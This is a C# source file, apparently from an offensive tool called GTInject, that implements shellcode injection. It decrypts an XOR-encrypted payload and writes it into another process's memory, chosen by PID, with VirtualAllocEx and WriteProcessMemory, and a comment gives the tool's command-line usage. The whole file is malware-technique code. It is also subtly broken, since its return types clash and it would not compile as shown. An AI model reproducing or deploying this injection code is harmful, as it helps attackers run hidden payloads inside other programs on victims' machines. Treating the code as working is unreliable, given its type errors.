using System;
using System.Runtime.InteropServices;
using System.Diagnostics;

namespace GTInject.memoryOptions
{
    internal class memory
    {
        public static IntPtr SelectMemOption(int memoption, int execoption, string xorkey, string binsrctype, string binsrcpath, int pid, int tid)
        {
            switch (memoption)
            {
                case 1:
                    return memopt1(binsrctype, binsrcpath, xorkey, pid);
                    break;
                case 2:
                    return IntPtr.Zero;
                    break;
            }
            return IntPtr.Zero;
        }
        private static (IntPtr, IntPtr) memopt1(string binLocation, string bytePath, string xorkey, int ProcID)
        {
            // //  GTInject.exe inject memoryOption execOption xorkey binSrcType binSourcePath PID TID
            /////////////////////////////////////
            // OPTION 1 == VirtualAllocEx && WriteProcessMemory (WINAPI)
            /////////////////////////////////////

            Console.WriteLine(  "  Allocate memory using WinAPIs - VirtualAllocEx and WriteProcMem");

            // Got what we need to start injection
            var plainBytes = GetShellcode.GetShellcode.readAndDecryptBytes(binLocation, bytePath, xorkey);
                
            Process pid = Process.GetProcessById(ProcID);
            IntPtr vMemAddr = VirtualAllocEx(pid.Handle, (IntPtr)0, (uint)plainBytes.Length, AllocationType.Commit | AllocationType.Reserve, MemoryProtection.ExecuteRead);

            IntPtr outsize;
            var writeResp = WriteProcessMemory(pid.Handle, vMemAddr, plainBytes, plainBytes.Length, out outsize); // Smart enough to virtual Protect the location to writable, then change back automatically

            if (writeResp)
            {
                Console.WriteLine( " Wrote to Mem using VirtAllocEx and WriteProcMem WINAPIs");
                return (vMemAddr, pid);
            }
            else
            {
                Console.WriteLine(" Failed to write with VirtAllocEx and WriteProcMem WINAPIs");
                return (IntPtr.Zero, IntPtr.Zero);
            }
        }


        /////////////////////////////////////
        // Supporting functions
        /////////////////////////////////////



        /////////////////////////////////////
        // PInvokes and Enums / Structures
        /////////////////////////////////////

        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, AllocationType flAllocationType, MemoryProtection flProtect);

        [Flags]
        public enum AllocationType
        {
            Commit = 0x1000,
            Reserve = 0x2000,
            Decommit = 0x4000,
            Release = 0x8000,
            Reset = 0x80000,
            Physical = 0x400000,
            TopDown = 0x100000,
            WriteWatch = 0x200000,
            LargePages = 0x20000000
        }

        [Flags]
        public enum MemoryProtection
        {
            Execute = 0x10,
            ExecuteRead = 0x20,
            ExecuteReadWrite = 0x40,
            ExecuteWriteCopy = 0x80,
            NoAccess = 0x01,
            ReadOnly = 0x02,
            ReadWrite = 0x04,
            WriteCopy = 0x08,
            GuardModifierflag = 0x100,
            NoCacheModifierflag = 0x200,
            WriteCombineModifierflag = 0x400
        }

        [DllImport("kernel32.dll")]
        public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, Int32 nSize, out IntPtr lpNumberOfBytesWritten);


    }
}
